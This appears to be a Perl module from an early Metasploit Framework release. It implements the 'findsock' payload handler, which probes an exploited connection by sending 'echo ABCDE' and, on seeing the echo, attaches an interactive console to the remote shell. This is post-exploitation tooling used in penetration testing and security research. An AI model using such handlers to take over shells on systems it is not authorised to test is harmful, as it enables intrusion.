

package Msf::PayloadComponent::FindConnection;
use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use IO::Socket::INET;
use IO::Select;

my $info = {
  'Keys' => ['findsock'],
  'UserOpts' => { },
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new(@_);
  $self->_Info($self->MergeHashRec($info, $self->_Info));
  return($self);
}

sub ChildHandler {
  my $self = shift;
  my $sock = shift;
  my $blocking = $sock->blocking;
  my $tries = 0;

  $self->{'_Buffer'} = '';

  $sock->blocking(1);
  $sock->autoflush(1);
  
  sleep(1);

  my $selector = IO::Select->new($sock);

AGAIN:
  my @ready = $selector->can_write(0.5);

  goto DONE if(!@ready || !$ready[0]->connected);

  eval { $ready[0]->send("echo ABCDE\r\n"); };

AGAIN_NOSEND:
  @ready = $selector->can_read(0.5);

  goto CHECK_AGAIN if(!@ready || !$ready[0]->connected);

  my $data;
  $ready[0]->recv($data, 4096);
  
  goto AGAIN if(!length($data));
	$self->{'_Buffer'} .= $data;
  if($data =~ /ABCDE/) {
    $self->PipeRemoteIn($ready[0]);
    $self->PipeRemoteOut($ready[0]);
    $self->PrintLine('[*] Findsock found shell...');

	$self->{'_Buffer'} =~ s/echo ABCDE//gm;
	$self->{'_Buffer'} =~ s/ABCDE//gm;

	 if (length($self->{'_Buffer'}) > 0)
	 {
	 	$self->Print($self->{'_Buffer'});
	}

    $self->HandleConsole;
    exit(0);
  }
  else
  {
  	goto AGAIN_NOSEND;
	}

CHECK_AGAIN:
  if ($tries == 0)
  {
	$tries++;
	goto AGAIN;
  }

DONE:

  $sock->blocking($blocking);
  return;
}

sub SigHandler {
  my $self = shift;
}
1;
